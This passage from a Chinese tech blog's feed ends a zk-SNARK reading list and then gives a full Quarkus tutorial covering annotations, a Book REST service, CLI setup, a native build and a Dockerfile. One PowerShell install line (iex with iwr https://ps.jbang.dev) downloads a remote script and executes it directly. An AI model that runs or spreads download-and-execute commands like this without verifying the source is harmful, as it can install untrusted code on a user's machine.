zk-SNARKs? |Zcash</a></p><p>官方V神教程系列，建议按顺序学习</p><ul><li><ahref="https://medium.com/@VitalikButerin/quadratic-arithmetic-programs-from-zero-to-hero-f6d558cea649">QuadraticArithmetic Programs: from Zero to Hero | by Vitalik Buterin |Medium</a></li><li><ahref="https://medium.com/@VitalikButerin/exploring-elliptic-curve-pairings-c73c1864e627">ExploringElliptic Curve Pairings | by Vitalik Buterin | Medium</a></li><li><ahref="https://medium.com/@VitalikButerin/zk-snarks-under-the-hood-b33151a013f6">Zk-SNARKs:Under the Hood. This is the third part of a series of… | by VitalikButerin | Medium</a></li></ul><p>其他参考：</p><p>这张流程图非常的赞：<ahref="https://blog.csdn.net/weixin_43179764/article/details/102807826?spm=1001.2014.3001.5501">zk-snark之R1CS-&gt;QAP_江小白希的博客-CSDN博客</a></p><p><ahref="https://www.cnblogs.com/linguanh/p/10892344.html">详细讲解：零知识证明之 zk-SNARK 开篇 - 指尖下的幽灵 - 博客园 (cnblogs.com)</a></p><p><ahref="https://zhuanlan.zhihu.com/p/58665745?utm_source=qq&amp;utm_medium=social&amp;utm_oi=894491492633182208">多项式的矩阵表示及乘法运算- 知乎 (zhihu.com)</a></p><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:33%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;zk-SNARKs即&quot;&lt;strong&gt;zero knowledge Succinct Non-interactive Argument
of Knowledge&lt;/strong&gt;&quot;，第一次见到是在ZCash的介绍里
&lt;code&gt;Zcash is the first widespread application of zk-SNARKs, a novel form of zero-knowledge cryptography. ...&lt;/code&gt;，他给出了&lt;strong&gt;简洁&lt;/strong&gt;的&lt;strong&gt;非交互式零知识证明&lt;/strong&gt;的办法，属于零知识证明的一种。&lt;/p&gt;
&lt;p&gt;zk-SNARKs的第一个应用就是Zcash，可以做到毫秒级的验证效果，但是产生这个证明的过程较为复杂。这篇开始学习一下流程。大致上流程如下：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Computation计算问题 -&amp;gt; Arithmetic Circuit代数电路 -&amp;gt;
R1CS -&amp;gt; QAP -&amp;gt; zk-SNARK&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/zk-SNARKs-简洁的非交互式零知识证明学习(一)/zk-snarks.jpg&quot; style=&quot;zoom: 80%;&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="密码学" scheme="https://lzwgiter.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="密码学" scheme="https://lzwgiter.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    <category term="区块链技术" scheme="https://lzwgiter.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>Quarkus学习（一）概述以及编写REST服务</title>
    <link href="https://lzwgiter.github.io/posts/a8e0eb2d.html"/>
    <id>https://lzwgiter.github.io/posts/a8e0eb2d.html</id>
    <published>2021-08-22T05:48:57.000Z</published>
    <updated>2022-05-06T13:57:14.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>Quarkus -- A Kubernetes Native Java stack tailored forOpenJDK HotSpot and GraalVM, crafted from the best of breed Javalibraries and standards.</strong></p><p>该框架定义为Kubernetes原生框架，可以很好的解决Serverless架构下资源占用大、冷启动慢等问题，实际效果还是挺惊艳的。这一篇开始学习Quarkus框架，本篇内容如下：</p><ul><li>介绍基本概念</li><li>学习写简单的RESTful项目</li><li>学习构建可执行文件以及构建Docker镜像</li></ul><p><img src="/img/Quarkus学习（一）概述以及编写REST服务/55c78ef5546cbae1f7b88dc2241019c7.jpeg" style="zoom:80%;" /></p></blockquote><span id="more"></span><h1 id="quarkus介绍">Quarkus介绍</h1><h2 id="什么是quarkus">什么是Quarkus?</h2><p>官方对Quarkus的介绍是<code>A Kubernetes Native Java stack tailored for OpenJDK HotSpot and GraalVM, crafted from the best of breed Java libraries and standards.</code></p><p>所以我们可以管窥它的特点：</p><ul><li>Kubernetes原生，即对容器化技术友好</li><li>底层虚拟机可以使用HotSpot或者GraalVM</li><li>集成了现存的很多优秀的Java库和标准</li></ul><h2 id="为什么要用quarkus">为什么要用Quarkus？</h2><p>根据2020年NewRelic调查，在云服务领域，Java只占了6%的使用，具体如图：(图片来源：<ahref="https://opensource.com/downloads/java-serverless-ebook">A guide toJava serverless functions | Opensource.com</a>)</p><p><img src="/img/Quarkus学习（一）概述以及编写REST服务/image-20210823083606274.png" alt="image-20210823083606274"  /></p><p>那么造成这个的原因是什么？<strong>很难在如Kubernetes的容器平台中优化Java的应用程序</strong>，我们可以使用NodeJs、Go语言进行一个对比，看看同样资源下支持的应用程序数目：</p><p><img src="/img/Quarkus学习（一）概述以及编写REST服务/image-20210823083834106.png" alt="image-20210823083834106"  /></p><p>由于需要给每一个JVM堆分配内存，导致了Java应用程序较高的内存开销，相比与其他语言，<strong>尤其是内存开极小的GO</strong>，那基本上没得看，所以Go在云服务领域很流行。</p><h2 id="为什么不继续用spring">为什么不继续用Spring？</h2><p>上一节的原因导致了直接上Spring不是很合适，<strong>虽然，SpringFunction支持使用java.util.function包来编写反应式函数，Spring也支持你把应用程序部署到Serverless平台上去，比如Kubeless、ApacheOpenWhisk、Fission、ProjectRiff等。但是却也造成了包括上一节的问题：</strong></p><ul><li>较大的内存开销</li><li>冷启动慢</li><li>响应时间缓慢</li></ul><p>上述的问题如果放到不是Serverless的平台上，比如Kubernetes上，只会更严重。而对于Quarkus框架，官方宣称的开销如下：</p><p><imgsrc="/img/Quarkus学习（一）概述以及编写REST服务/compare.png" /></p><p>可以看到不管是搭配HotSpot或者GraalVM，这个开销都要小得多得多。<strong>尤其是搭配GraalVM，它和HotSpot一样，属于JVM的一种，典型的GraalVM就是<ahref="https://github.com/graalvm/graalvm-ce-builds/releases">graalvm/graalvm-ce-builds</a>，或者<ahref="https://github.com/graalvm/mandrel/releases">graalvm/mandrel(github.com)</a></strong>。</p><h1 id="常用注解以及restful程序编写">常用注解以及RESTful程序编写</h1><h2 id="生成项目">生成项目</h2><h3 id="官方项目生成网页">官方项目生成网页</h3><p>类似start.spring.io一样，Quarkus官方也有类似的网页，地址：<ahref="https://code.quarkus.io/">Quarkus - Start coding withcode.quarkus.io</a></p><p>比如在RESTful项目中，最基本需要两个依赖库：</p><p><imgsrc="/img/Quarkus学习（一）概述以及编写REST服务/image-20210822161709836.png" /></p><p>直接下载到本地就可以使用了。</p><h3 id="idea生成项目">IDEA生成项目</h3><p>在Ultimate版本中继承了Jetbrains闭源的插件，直接从这里进去就可以了，和Spring那个一样一样的。</p><p><imgsrc="/img/Quarkus学习（一）概述以及编写REST服务/image-20210822161817772.png" /></p><p><imgsrc="/img/Quarkus学习（一）概述以及编写REST服务/image-20210822162058472.png" /></p><p>quarkus中最基本的rest服务需要JAX-RS这个组件，关于json的插件你可以用自己喜欢的，比如Jackson或者JSON-B，这里用Jackson。</p><p><imgsrc="/img/Quarkus学习（一）概述以及编写REST服务/image-20210822162226809.png" /></p><h3 id="安利一个工具quarkus-cli">安利一个工具：Quarkus-cli</h3><p>在官方的教程里，每次新建一个项目都需要敲很多的参数，个人觉得有点麻烦，好比这样的：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mvn io.quarkus:quarkus-maven-plugin:2.1.3.Final:create \</span><br><span class="line">    -DprojectGroupId=org.acme \</span><br><span class="line">    -DprojectArtifactId=rest-json-quickstart \</span><br><span class="line">    -DclassName=&quot;org.acme.rest.json.FruitResource&quot; \</span><br><span class="line">    -Dpath=&quot;/fruits&quot; \</span><br><span class="line">    -Dextensions=&quot;resteasy,resteasy-jackson&quot;</span><br></pre></td></tr></table></figure><p>实际上在官方的页面里有推荐这么一个官方的小工具，可以帮助你新建一个项目，其实和Go语言里的<code>Beego</code>中的<code>bee</code>工具作用差不多：</p><p><img src="/img/Quarkus学习（一）概述以及编写REST服务/image-20210822140736545.png" alt="image-20210822140736545" style="zoom: 67%;" /></p><p><strong>只不过这玩意儿貌似还在改进中，但是实测可以用。</strong>安装方法如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先安装JBang，这个小玩意儿还挺有意思的，可以看看：https://www.jbang.dev/</span></span><br><span class="line"><span class="built_in">iex</span> <span class="string">&quot;&amp; &#123; <span class="variable">$</span>(iwr https://ps.jbang.dev) &#125; app setup&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后我推荐你先去阿里云仓库下载quarkus-cli的runner包，然后再安装.</span></span><br><span class="line"><span class="comment"># https://developer.aliyun.com/mvn/search 搜索quarkus-cli，然后找到quarkus-cli-2.1.0.Final-runner.jar就行，这是最新的</span></span><br><span class="line"><span class="comment"># 然后jbang命令安装，这里我取名为quarkus。建议把jar包放到本地maven仓库的io.quarkus.quarkus-cli文件夹下</span></span><br><span class="line">jbang app install <span class="literal">--force</span> <span class="literal">--fresh</span> <span class="literal">--name</span> quarkus &lt;你的jar包的位置&gt;</span><br></pre></td></tr></table></figure><p>安装后就可以正常用了：</p><p><img src="/img/Quarkus学习（一）概述以及编写REST服务/image-20210822141629148.png" alt="image-20210822141629148" style="zoom: 80%;" /></p><p>默认的create不带子命令就是在创建应用，<strong>Quarkus-cli创建项目时候有一个非常Nice的参数：--dry-run，对没错就是k8s那个dry-run，你可以预览并检查生成的选项而不是直接生成项目。好比这样：</strong></p><p><img src="/img/Quarkus学习（一）概述以及编写REST服务/image-20210822142927709.png" alt="image-20210822142927709" style="zoom:80%;" /></p><p>我只能说好用的一批。好比我们创建一个rest-demo项目：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">quarkus create cn.edu.xidian:quarkus<span class="literal">-rest-demo</span> <span class="literal">-P</span> <span class="number">2.1</span>.<span class="number">3</span>.Final</span><br><span class="line"><span class="comment"># 输出：</span></span><br><span class="line"><span class="comment"># Creating an app (default project type, see --help).</span></span><br><span class="line"><span class="comment"># -----------</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># applying codestarts...</span></span><br><span class="line"><span class="comment"># &gt;&gt; java</span></span><br><span class="line"><span class="comment"># &gt;&gt; maven</span></span><br><span class="line"><span class="comment"># &gt;&gt; quarkus</span></span><br><span class="line"><span class="comment"># &gt;&gt; config-properties</span></span><br><span class="line"><span class="comment"># &gt;&gt; dockerfiles</span></span><br><span class="line"><span class="comment"># &gt;&gt; maven-wrapper</span></span><br><span class="line"><span class="comment"># &gt;&gt; resteasy-codestart</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># -----------</span></span><br><span class="line"><span class="comment"># [SUCCESS] quarkus project has been successfully generated in:</span></span><br><span class="line"><span class="comment"># --&gt; C:\Users\22629\IdeaProjects\quarkus-rest-demo</span></span><br><span class="line"><span class="comment"># -----------</span></span><br><span class="line"><span class="comment"># Navigate into this directory and get started: quarkus dev</span></span><br></pre></td></tr></table></figure><p>项目结构如下，可以对比Spring发现多了docker的文件夹，其他没啥区别。<imgsrc="/img/Quarkus学习（一）概述以及编写REST服务/image-20210822143308436.png"alt="image-20210822143308436" /></p><p>编写结束后如果要启动项目只需要在项目文件夹下执行<code>quarkus dev</code>就可以了，也不需要<code>mvn compile quarkus:dev</code>了，这个工具还是很方便的。</p><h2 id="常用注解">常用注解</h2><p>下面小结一下在Quarkus框架中常用的注解，这里主要是编写Restful服务常用的。Quarkus的ioc和rest规范都是跟从的官方，即：</p><ul><li>ioc使用的是JSR 299和JSR 330</li><li>rest使用的是JAX-RS</li></ul><p>所以其实很多注解都是从上面这些依赖中了来的。下表是我自己总结的常用的Quarkus中的注解，后续我会继续添加这个表</p><table><colgroup><col style="width: 30%" /><col style="width: 69%" /></colgroup><thead><tr class="header"><th>注解名称</th><th>注解含义</th></tr></thead><tbody><tr class="odd"><td><strong>Rest类： javax.wx.rs包</strong></td><td></td></tr><tr class="even"><td><span class="citation" data-cites="Path">@Path</span></td><td>指明web的请求路径，比如@Path('/book/{name}')，<strong>类似Spring的@RequestMapping</strong></td></tr><tr class="odd"><td><span class="citation"data-cites="PathParameter">@PathParameter</span></td><td>配合@Path注解获取GET参数，比如上面那个的获取方法：public void func(<span class="citation"data-cites="PathParameter">@PathParameter</span>('name') String name){}</td></tr><tr class="even"><td><span class="citation" data-cites="Produces">@Produces</span></td><td>指明这个类所有函数/单个函数返回的参数类型，比如REST项目@Produces(MediaType.APPLICATION_JSON)</td></tr><tr class="odd"><td><span class="citation" data-cites="Consumes">@Consumes</span></td><td>指明这个函数所有函数/单个函数<strong>接收</strong>的参数类型，比如REST项目@Consumes(MediaType.APPLICATION_JSON)</td></tr><tr class="even"><td><span class="citation" data-cites="GET">@GET</span></td><td>声明GET方法，<strong>类似Spring的@GetMapping</strong></td></tr><tr class="odd"><td><span class="citation" data-cites="POST">@POST</span></td><td>声明POST方法，<strong>类似Spring的@PostMapping</strong></td></tr><tr class="even"><td><span class="citation" data-cites="DELETE">@DELETE</span></td><td>声明DELETE方法</td></tr><tr class="odd"><td><span class="citation" data-cites="PUT">@PUT</span></td><td>声明PUT方法</td></tr><tr class="even"><td></td><td></td></tr><tr class="odd"><td><strong>Bean相关类</strong></td><td></td></tr><tr class="even"><td><span class="citation" data-cites="Injection">@Injection</span></td><td>声明一个可以被注入的类、方法、变量，<strong>类似@Autowired</strong></td></tr><tr class="odd"><td><span class="citation" data-cites="Singleton">@Singleton</span></td><td>同@Inject，但是同时他也是个单例，<strong>类似Spring的@Component</strong></td></tr><tr class="even"><td><span class="citation"data-cites="ApplicationScoped">@ApplicationScoped</span></td><td>声明一个全局变量的bean</td></tr><tr class="odd"><td></td><td></td></tr><tr class="even"><td><strong>配置类</strong></td><td></td></tr><tr class="odd"><td><span class="citation"data-cites="ConfigProperty">@ConfigProperty</span></td><td>从配置文件(application.properties)中读取变量，比如@ConfigProperty(name="vartest",default="test")，即从配置文件中读取'vartest'变量的值，没有的话就是用default值</td></tr></tbody></table><h2 id="一个restful程序示例">一个RESTful程序示例</h2><blockquote><p>下面写一个简单的图书restful服务。</p></blockquote><p>Spring中我们将业务控制器分开，xxxController这种，Quarkus中喜欢把这个叫Resource，</p><p>我们先定义一个实体Book，<strong>这里注意，我们将使用Jackson来对对象进行序列化处理，所以一定要设置Getter，不然会获取不到属性，你也可以用<code>@JsonIgnore</code>注解来屏蔽一些属性</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Objects;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2021/08/22</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Book</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 索书号</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String indexId;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 书本名称</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 作者信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String author;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Book</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Book</span><span class="params">(String name, String indexId, String author)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = <span class="string">&quot;《&quot;</span> + name + <span class="string">&quot;》&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.indexId = indexId;</span><br><span class="line">        <span class="built_in">this</span>.author = author;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getIndexId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> indexId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAuthor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> author;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们定义对应的Resource，<strong>可以看到所有与RESTful相关的注解，都来自javax.ws.rx包，都是JAX-RS规范。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.ws.rs.Path;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.Produces;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.Consumes;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.core.MediaType;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.GET;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.POST;</span><br><span class="line"><span class="keyword">import</span> javax.ws.rs.DELETE;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2021/08/22</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Path(&quot;/book&quot;)</span></span><br><span class="line"><span class="meta">@Produces(MediaType.APPLICATION_JSON)</span></span><br><span class="line"><span class="meta">@Consumes(MediaType.APPLICATION_JSON)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BookResource</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;Book&gt; bookList = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BookResource</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.bookList.add(<span class="keyword">new</span> <span class="title class_">Book</span>(<span class="string">&quot;书_1&quot;</span>, <span class="string">&quot;abcdefg1&quot;</span>, <span class="string">&quot;lzwgiter&quot;</span>));</span><br><span class="line">        <span class="built_in">this</span>.bookList.add(<span class="keyword">new</span> <span class="title class_">Book</span>(<span class="string">&quot;书_2&quot;</span>, <span class="string">&quot;gfseffda&quot;</span>, <span class="string">&quot;lzwgiter&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GET</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Book&gt; <span class="title function_">getAllBooks</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.bookList;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@POST</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Book&gt; <span class="title function_">addBook</span><span class="params">(Book book)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.bookList.add(book);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.bookList;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@DELETE</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Book&gt; <span class="title function_">delBook</span><span class="params">(Book book)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.bookList.removeIf(existBook -&gt; existBook.equals(book));</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.bookList;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码编写后，我们<code>quarkus dev</code>让他运行：</p><figure><imgsrc="/img/Quarkus学习（一）概述以及编写REST服务/image-20210822165316767.png"alt="image-20210822165316767" /><figcaption aria-hidden="true">image-20210822165316767</figcaption></figure><p>然后就可以请求服务了：</p><figure><imgsrc="/img/Quarkus学习（一）概述以及编写REST服务/image-20210823102743229.png"alt="image-20210823102743229" /><figcaption aria-hidden="true">image-20210823102743229</figcaption></figure><h2 id="构建可执行文件">构建可执行文件</h2><blockquote><p>接下来的两小节包括构建可执行文件和Docker镜像，这里不推荐使用那个quarkus-cli，它不支持打包到docker，建议用mvn命令。</p></blockquote><p><strong>这里我是在Linux下构建的可执行文件</strong>，windows下我会报只能使用AMD平台的错误，而且即使是在<code>x64 Native Tools Command Prompt for VS 2019</code>下不能解决。</p><p>构建直接使用命令<code>mvn package -Pnative</code>。</p><figure><imgsrc="/img/Quarkus学习（一）概述以及编写REST服务/image-20210823163646699.png"alt="image-20210823163646699" /><figcaption aria-hidden="true">image-20210823163646699</figcaption></figure><p>我虽然是在虚拟机里构建的，但是这个速度也有点慢了吧。。构建完成后会生成一个xx-runner的文件：</p><p><img src="/img/Quarkus学习（一）概述以及编写REST服务/image-20210823164605102.png" alt="image-20210823164605102" style="zoom: 80%;" /></p><p>然后我们直接<code>./xxx-runner</code>启动就可以了，<strong>我这里用的是官方基于OracleGraavlVM定制的一个下游版本，叫Mandrel，这时候你就发现牛逼的地方了：</strong></p><figure><imgsrc="/img/Quarkus学习（一）概述以及编写REST服务/image-20210823164745281.png"alt="image-20210823164745281" /><figcaption aria-hidden="true">image-20210823164745281</figcaption></figure><p>好家伙，22ms就起来了，我直呼<img src="/img/Quarkus学习（一）概述以及编写REST服务/image-20210823165047294.png" alt="image-20210823165047294" style="zoom:150%;" /></p><p><img src="/img/Quarkus学习（一）概述以及编写REST服务/image-20210823165225982.png" alt="image-20210823165225982"  /></p><p>当然运行结果是一样的。</p><h2 id="构建docker镜像">构建Docker镜像</h2><p>这里只介绍最简单的办法,前面我们已经通过<code>mvn package -Pnative</code>命令完成构建了，<strong>此时在你的<code>src/main/docker</code>目录里可以看到一个Dockerfile.native，内容如下，这个不需要你写。</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">####</span></span><br><span class="line"><span class="comment"># This Dockerfile is used in order to build a container that runs the Quarkus application in native (no JVM) mode</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Before building the container image run:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># ./mvnw package -Pnative</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Then, build the image with:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># docker build -f src/main/docker/Dockerfile.native -t quarkus/quarkus-rest-demo .</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Then run the container using:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># docker run -i --rm -p 8080:8080 quarkus/quarkus-rest-demo</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="keyword">FROM</span> registry.access.redhat.com/ubi8/ubi-minimal:<span class="number">8.4</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /work/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> 1001 /work \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">chmod</span> <span class="string">&quot;g+rwX&quot;</span> /work \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">chown</span> 1001:root /work</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --<span class="built_in">chown</span>=1001:root target/*-runner /work/application</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span></span><br><span class="line"><span class="keyword">USER</span> <span class="number">1001</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;./application&quot;</span>, <span class="string">&quot;-Dquarkus.http.host=0.0.0.0&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>然后我们按照说明去Docker中构建镜像：</p><blockquote><p>docker build -f src/main/docker/Dockerfile.native -tquarkus/quarkus-rest-demo .</p></blockquote><p><img src="/img/Quarkus学习（一）概述以及编写REST服务/image-20210823172244162.png" alt="image-20210823172244162" style="zoom:80%;" /></p><p>到这里镜像就构建好了，就可以投入使用了：</p><figure><imgsrc="/img/Quarkus学习（一）概述以及编写REST服务/image-20210823173013018.png"alt="image-20210823173013018" /><figcaption aria-hidden="true">image-20210823173013018</figcaption></figure><p><a href="https://opensource.com/downloads/java-serverless-ebook">Aguide to Java serverless functions | Opensource.com</a></p><h1 id="参考学习">参考学习</h1><p><a href="http://quarkus.io/guides/cli-tooling">Quarkus - BuildingQuarkus apps with Quarkus Command Line Interface (CLI)</a></p><p><a href="https://github.com/graalvm/mandrel/releases">Releases ·graalvm/mandrel (github.com)</a></p><p><a href="http://quarkus.io/guides/rest-json">Quarkus - Writing JSONREST Services</a></p><p><a href="http://quarkus.io/guides/building-native-image">Quarkus -Building a Native Executable</a></p><p><a href="http://quarkus.io/guides/container-image">Quarkus -Container Images</a></p><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:50%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Quarkus -- A Kubernetes Native Java stack tailored for
OpenJDK HotSpot and GraalVM, crafted from the best of breed Java
libraries and standards.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;该框架定义为Kubernetes原生框架，可以很好的解决Serverless架构下资源占用大、冷启动慢等问题，实际效果还是挺惊艳的。这一篇开始学习Quarkus框架，本篇内容如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;介绍基本概念&lt;/li&gt;
&lt;li&gt;学习写简单的RESTful项目&lt;/li&gt;
&lt;li&gt;学习构建可执行文件以及构建Docker镜像&lt;/li&gt;
&lt;/ul&gt;
